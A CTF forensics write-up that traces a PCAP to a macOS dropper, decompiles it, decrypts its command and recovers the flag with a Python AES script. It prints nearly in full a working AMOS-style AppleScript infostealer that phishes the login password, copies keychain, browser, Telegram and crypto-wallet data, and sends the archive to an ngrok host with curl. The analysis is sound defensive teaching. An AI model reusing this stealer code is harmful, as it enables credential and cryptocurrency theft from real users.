# Famous AMOS

> Cortex XDR has been flagging alerts non-stop this Friday due to a suspicious file being downloaded by Zhu Yuan. Thankfully, my Wireshark was running so we managed to track down some of the malicious activity. It seems like the user received a malicious attachment from an unknown domain via email, and executed it in their machine.
> 
> Note: The ZIP file contains software that is going to interact with your computer and files. Always handle such files in isolated, controlled, and secure environments.
> Author: warlocksmurf

## Overview
We were give a PCAP file to analyze. Using Protocol Hierarchy, I noticed some HTTP packets with files. So I extracted all the file into a folder.

![image](https://github.com/user-attachments/assets/c3a06a25-946c-43e0-859e-cf82c7058b8d)

```bash
├── bangboo.png
├── BetaTest.pdf
├── joinsystem
├── joinsystem(1)
└── LegitLobsterGameDownloader.dmg
```

When I check `joinsystem` hex bytes, it contains some dummy bytes followed by ZIP file signature, so I remove these bytes and we get a valid ZIP file. 

![image](https://github.com/user-attachments/assets/a3ebe6ef-2130-4992-aa96-e23f76b8f3ab)


Upon unzipping `joinsystem`, we get several files and one of the interesting file is `flag.enc`.

![image](https://github.com/user-attachments/assets/9ba53b7f-ef23-4967-b7bf-d07373646fff)

There is also `LegitLobsterGameDownloader.dmg` which is a disk image file used on macOS. We can extract the file using 7zip. 

You will see one file called `lobsterstealer` which is a Mac-O executable. We need to decompile it to see the source code of this executable. 

![image](https://github.com/user-attachments/assets/9ac726db-7b11-4354-8459-85f17a9320d2)

Open the executable file in Ghidra, I found out that the executable file decrypts some encrypted `hexData` using `DecryptionKey`, prints the decrypted command, and executes it. The `hex_to_bytes` and `rc4_decrypt` function suggests the use of the hexadecimals and RC4 encryption algorithm for the decryption process.
```c
undefined4 entry(void)

{
  basic_ostream *outputStream;
  basic_string commandOutput [24];
  vector encryptedData [24];
  basic_string DecryptionKey [24];
  basic_string hexData [40];
  basic_string<> temporaryString [24];
  basic_string<> additionalString [28];
  undefined4 returnValue;
  
  returnValue = 0;
  __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100ILi0EEEPKc
            (additionalString,&DAT_100004d19);
  __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100ILi0EEEPKc
            (temporaryString,"9f0fe4d8821ad05cc39a80644daeb8b1");
  hex_to_bytes(hexData);
  hex_to_bytes(DecryptionKey);
  rc4_decrypt(encryptedData,(vector *)hexData);
  std::__1::vector<>::begin[abi:ne180100]((vector<> *)encryptedData);
  std::__1::vector<>::end[abi:ne180100]((vector<> *)encryptedData);
  std::__1::basic_string<>::basic_string[abi:ne180100]<>((__wrap_iter)commandOutput);
  outputStream = std::__1::TEMPNAMEPLACEHOLDERVALUE<[abi:ne180100]<std::__1::operator<
                           ((basic_ostream *)PTR_cout_10000e0c8,"Decrypted command: ");
  outputStream = std::__1::TEMPNAMEPLACEHOLDERVALUE<[abi:ne180100]<char,std::__1::
                 char_traits<char>,std::__1::operator<(outputStream,commandOutput);
  std::__1::basic_ostream<char,std::__1::char_traits<char>>::operator<<[abi:ne180100]
            ((char_traits<char>> *)outputStream,std::__1::endl[abi:ne180100]<>);
  execute_decrypted_command(commandOutput);
  returnValue = 0;
  std::__1::basic_string<>::~basic_string((basic_string<> *)commandOutput);
  std::__1::vector<>::~vector[abi:ne180100]((vector<> *)encryptedData);
  std::__1::vector<>::~vector[abi:ne180100]((vector<> *)DecryptionKey);
  std::__1::vector<>::~vector[abi:ne180100]((vector<> *)hexData);
  std::__1::basic_string<>::~basic_string(temporaryString);
  std::__1::basic_string<>::~basic_string(additionalString);
  return returnValue;
}


```
`DecryptionKey` and `hexData` actually is `temporaryString` (9f0fe4d8821ad05cc39a80644daeb8b1) and `additionalString` (&DAT_100004d19) respectively. 

To see what value inside &DAT_100004d19, just double click and you can see the value. Extract all hex values

![image](https://github.com/user-attachments/assets/91be6a66-2bd5-473b-93a1-535866ec90e0)

Use CyberChef to decrypt RC4.

![image](https://github.com/user-attachments/assets/c933478e-083e-487f-b967-d526e343175e)

The script is a series of AppleScript functions designed for various system and file operations on macOS. The script looks malicious since it contains functions that can steal web cookies, plugins and other browser-related data. It also steals Telegram Data and cryptocurrencies wallet.

The stolen files (/tmp/out.zip) will be send to a specified URL (http://b2eb-115-135-31-192.ngrok-free.app/joinsystem) through POST request. 


```osa
set result_send to do shell script "curl -X POST -H \"user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\" -H \"BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\" --max-time 300 --retry 5 --retry-delay 10 -F \"file1=@/tmp/out.zip\" http://b2eb-115-135-31-192.ngrok-free.app/joinsystem"
```

<details open>
<summary>Click to show script</summary>
<br>
  
```
osascript -e '
set release to true
set filegrabbers to true
if release then
	try
		tell window 1 of application "Terminal" to set visible to false
	end try
end if
on filesizer(paths)
	set fsz to 0
	try
		set theItem to quoted form of POSIX path of paths
		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
	end try
	return fsz
end filesizer
on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir
on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
end FileName
on BeforeFileName(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
end BeforeFileName
on writeText(textToWrite, filePath)
	try
		set folderPath to BeforeFileName(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText
on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to BeforeFileName(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite
on isDirectory(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
		return false
	end try
end isDirectory
on GrabFolderLimit(sourceFolder, destinationFolder)
	try
		set bankSize to 0
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolderLimit(itemPath, savePath)
				else
					set fsz to filesizer(itemPath)
					set bankSize to bankSize + fsz
					if bankSize < 10 * 1024 * 1024 then
						readwrite(itemPath, savePath)
					end if
				end if
			end if
		end repeat
	end try
end GrabFolderLimit
on GrabFolder(sourceFolder, destinationFolder)
	try
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolder(itemPath, savePath)
				else
					readwrite(itemPath, savePath)
				end if
			end if
		end repeat
	end try
end GrabFolder
on encryptFlag(sussyfile, inputFile, outputFile)
	set hexKey to (do shell script "md5 -q " & sussyfile)
	set hexIV to (do shell script "echo \"" & hexKey & "\" | rev")
    do shell script "openssl enc -aes-128-cbc -in " & quoted form of inputFile & " -out " & quoted form of outputFile & " -K " & hexKey & " -iv " & hexIV
end encryptFlag
on parseFF(firefox, writemind)
	try
		set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
		set fileList to list folder firefox without invisibles
		repeat with currentItem in fileList
			set fpath to writemind & "ff/" & currentItem
			set readpath to firefox & currentItem
			repeat with FFile in myFiles
				readwrite(readpath & FFile, fpath & FFile)
			end repeat
		end repeat
	end try
end parseFF
on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid
on getpwd(username, writemind)
	try
		if checkvalid(username, "") then
			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
			writeText(result as string, writemind & "masterpass-chrome")
		else
			repeat
				set result to display dialog "Required Application Helper.\nPlease enter password for continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
				set password_entered to text returned of result
				if checkvalid(username, password_entered) then
					writeText(password_entered, writemind & "pwd")
					return password_entered
				end if
			end repeat
		end if
	end try
	return ""
end getpwd
on grabPlugins(paths, savePath, pluginList, index)
	try
		set fileList to list folder paths without invisibles
		repeat with PFile in fileList
			repeat with Plugin in pluginList
				if (PFile contains Plugin) then
					set newpath to paths & PFile
					set newsavepath to savePath & "/" & Plugin
					if index then
						set newsavepath to newsavepath & "/IndexedDB/"
					end if
					GrabFolder(newpath, newsavepath)
				end if
			end repeat
		end repeat
	end try
end grabPlugins
on chromium(writemind, chromium_map)
	set pluginList to {"keenhcnmdmjjhincpilijphpiohdppno", "hbbgbephgojikajhfbomhlmmollphcad", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "dhgnlgphgchebgoemcjekedjjbifijid", "hifafgmccdpekplomjjkcfgodnhcellj", "kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle", "fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj", "dkdedlpgdmmkkfjabffeganieamfklkm", "bcopgchhojmggmffilplmbdicgaihlkp", "kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg", "mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn", "gcbjmdjijjpffkpbgdkaojpmaninaion", "nhnkbkgjikgcigadomkphalanndcapjk", "bhhhlbepdkbapadjdnnojkbgioiodbic", "hoighigmnhgkkdaenafgnefkcmipfjon", "klghhnkeealcohjjanjjdaeeggmfmlpl", "nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjbbldcngcnapndodjp", "ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin", "fhilaheimglignddkjgofkcbgekhenbh", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "cihmoadaighcejopammfbmddcmdekcje", "lodccjjbdhfakaekdiahmedfbieldgik", "omaabbefbmiijedngplfjmnooppbclkk", "cjelfplplebdjjenllpjcblmjkfcffne", "jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih", "flpiciilemghbmfalicajoolhkkenfel", "hcflpincpppdclinealmandijcmnkbgn", "aeachknmefphepccionboohckonoeemg", "nlobpakggmbcgdbpjpnagmdbdhdhgphk", "momakdpclmaphlamgjcndbgfckjfpemp", "mnfifefkajgofkcjkemidiaecocnkjeh", "fnnegphlobjdpkhecapkijjdkgcjhkib", "ehjiblpccbknkgimiflboggcffmpphhp", "ilhaljfiglknggcoegeknjghdgampffk", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "imlcamfeniaidioeflifonfjeeppblda", "mdjmfdffdcmnoblignmgpommbefadffd", "ooiepdgjjnhcmlaobfinbomgebfgablh", "pcndjhkinnkaohffealmlmhaepkpmgkb", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "cgeeodpfagjceefieflmdfphplkenlfk", "dlcobpjiigpikoobohmabehhmhfoodbb", "jiidiaalihmmhddjgbnbgdfflelocpak", "bocpokimicclpaiekenaeelehdjllofo", "pocmplpaccanhmnllbbkpgfliimjljgo", "cphhlgmgameodnhkjdmkpanlelnlohao", "mcohilncbfahbmgdjkbpemcciiolgcge", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "khpkpbbcccdmmclmpigdgddabeilkdpd", "ejjladinnckdgjemekebdpeokbikhfci", "phkbamefinggmakgklpkljjmgibohnba", "epapihdplajcdnnkdeiahlgigofloibg", "hpclkefagolihohboafpheddmmgdffjm", "cjookpbkjnpkmknedggeecikaponcalb", "cpmkedoipcpimgecpmgpldfpohjplkpp", "modjfdjcodmehnpccdjngmdfajggaoeh", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "kncchdigobghenbbaddojjnnaogfppfj", "efbglgofoippbgcjepnhiblaibcnclgk", "mcbigmjiafegjnnogedioegffbooigli", "fccgmnglbhajioalokbcidhcaikhlcpm", "hnhobjmcibchnmglfbldbfabcgaknlkj", "apnehcjmnengpnmccpaibjmhhoadaico", "enabgbdfcbaehmbigakijjabdpdnimlg", "mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "ammjlinfekkoockogfhdkgcohjlbhmff", "abkahkcbhngaebpcgfmhkoioedceoigp", "dcbjpgbkjoomeenajdabiicabjljlnfp", "gkeelndblnomfmjnophbhfhcjbcnemka", "pnndplcbkakcplkjnolgbkdgjikjednm", "copjnifcecdedocejpaapepagaodgpbh", "hgbeiipamcgbdjhfflifkgehomnmglgk", "mkchoaaiifodcflmbaphdgeidocajadp", "ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae", "nknhiehlklippafakaeklbeglecifhad", "ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee", "nphplpgoakhhjchkkhmiggakijnkhfnd", "cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "niiaamnmgebpeejeemoifgdndgeaekhe", "odpnjmimokcmjgojhnhfcnalnegdjmdn", "lbjapbcmmceacocpimbpbidpgmlmoaao", "hnfanknocfeofbddgcijnmhnfnkdnaad", "hpglfhgfnhbgpjdenjgmdgoeiappafln", "egjidjbpglichdcondbcbdnbeeppgdph", "ibljocddagjghmlpgihahamcghfggcjc", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna", "mfhbebgoclkghebffdldpobeajmbecfk", "nlbmnnijcnlegkjjpcfjclmcfggfefdm", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "acmacodkjbdgmoleebolmdjonilkdbch", "agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kkpehldckknjffeakihjajcjccmcjflh", "jaooiolkmfcmloonphpiiogkfckgciom", "ojggmchlghnjlapmfbnjholfjkiidbch", "pmmnimefaichbcnbndcfpaagbepnjaig", "oiohdnannmknmdlddkdejbmplhbdcbee", "aiifbnbfobpmeekipheeijimdpnlpgpp", "aholpfdialjgjfhomihkjbmgjidlcdno", "anokgmphncpekkhclmingpimjmcooifb", "kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe", "ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa", "fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif", "dmkamcknogkgcdfhhbddcghachkejeap", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk", "mapbhaebnddapnmifbbkgeedkeplgjmf", "cmndjbecilbocjfkibfbifhngkdmjgog", "kpfopkelmapcoipemfendmdcghnegimn", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb", "opcgpfmipidbgpenhmajoajpbobppdil", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "kgdijkcfiglijhaglibaidbipiejjfdp", "hdkobeeifhdplocklknbnejdelgagbao", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "nngceckbapebfimnlniiiahkandclblb"}
	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromium in chromium_map
		set savePath to writemind & "Chromium/" & item 1 of chromium & "_"
		try
			set fileList to list folder item 2 of chromium without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromium & currentItem & CFile)
						if ((CFile as string) is equal to "/Network/Cookies") then
							set CFile to "/Cookies"
						end if
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, savePath & currentItem, pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, savePath & currentItem, pluginList, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end chromium
on telegram(writemind, library)
		try
			GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Data/")
		end try
end telegram
on deskwallets(writemind, deskwals)
	repeat with deskwal in deskwals
		try
			GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
		end try
	end repeat
end deskwallets
on filegrabber(writemind)
	try
		set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
		mkdir(destinationFolderPath)
		set extensionsList to {"pdf"," docx"," doc"," wallet"," keys"}
		set bankSize to 0
		tell application "Finder"
			try
				set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
				duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
				set name of result to "saf1"
			end try
			try
				set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
				try
					duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
				end try
				set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
				set notesAccounts to folder (notesFolderPath & "Accounts:")
				try
					set notesFolder to folder notesFolderPath
					set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder
					repeat with aFile in notesFiles
						try
							duplicate aFile to folder destinationFolderPath with replacing
						end try
					end repeat
				end try
			end try
			try
				set desktopFiles to every file of desktop
				set documentsFiles to every file of folder "Documents" of (path to home folder)
				set downloadsFiles to every file of folder "Downloads" of (path to home folder)
				repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
					set fileExtension to name extension of aFile
					if fileExtension is in extensionsList then
						set filesize to size of aFile
						if (bankSize + filesize) < 10 * 1024 * 1024 then
							try
								duplicate aFile to folder destinationFolderPath with replacing
								set bankSize to bankSize + filesize
							end try
						else
							exit repeat
						end if
					end if
				end repeat
			end try
		end tell
	end try
end filegrabber
on send_data(attempt)
	try
		set result_send to do shell script "curl -X POST -H \"user: 85JDXWQ4CL67-XaZnPqOLmHFv1yNRXZOmNTpeJMw4AP=\" -H \"BuildID: /xpLmzYqPrVH-jKOpfmncviXt2zDgp/-NFM7tQhb6tp=\" --max-time 300 --retry 5 --retry-delay 10 -F \"file1=@/tmp/out.zip\" http://b2eb-115-135-31-192.ngrok-free.app/joinsystem"
	on error
		if attempt < 40 then
			delay 3
			send_data(attempt + 1)
		end if
	end try
end send_data
set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000 + 1000))"
set writemind to "/tmp/" & randomNumber & "/"
try
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try
set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind)
delay 0.01
set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/"}, {"Coccoc", library & "Coccoc/"}}
set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
if release then
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
	readwrite(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
	readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
end if
if filegrabbers then
	filegrabber(writemind)
end if
writeText(username, writemind & "username")
set ff_paths to {library & "Firefox/Profiles/", library &
```
</details>

The flag is encrypted using `encryptFlag` function. It uses AES 128 CBC to encrypt and derive `hexKey` from md5 of sussyfile, `hexIV` was derived from reversed `hexKey`.

```
on encryptFlag(sussyfile, inputFile, outputFile)
	set hexKey to (do shell script "md5 -q " & sussyfile)
	set hexIV to (do shell script "echo \"" & hexKey & "\" | rev")
    do shell script "openssl enc -aes-128-cbc -in " & quoted form of inputFile & " -out " & quoted form of outputFile & " -K " & hexKey & " -iv " & hexIV
end encryptFlag
```
In order to decrypt the `flag.enc`, we need `sussyfile` for its MD5 hash. `sussyfile` in this case is `bangboo.png`. You can create a Python script for decryption process. The output will contains PNG file signature so add the extension.

```py
import hashlib
from Crypto.Cipher import AES
from binascii import unhexlify

def decrypt_file(sussyfile, encrypted_file, output_file):
    with open(sussyfile, 'rb') as file:
        sussy_data = file.read()
    hex_key = hashlib.md5(sussy_data).hexdigest()

    hex_iv = hex_key[::-1]  # Reverse the MD5 hash string

    key = unhexlify(hex_key)
    iv = unhexlify(hex_iv)

    with open(encrypted_file, 'rb') as enc_file:
        ciphertext = enc_file.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]

    with open(output_file, 'wb') as out_file:
        out_file.write(plaintext)

    print(f"Decryption complete. File saved as: {output_file}")

sussyfile = "bangboo.png"       
encrypted_file = "flag.enc"     
output_file = "flag_decrypted"  

decrypt_file(sussyfile, encrypted_file, output_file)
```
## Flag
![flag_decrypted](https://github.com/user-attachments/assets/0de8da40-2140-4c3b-be2c-6dcc8e389a26)
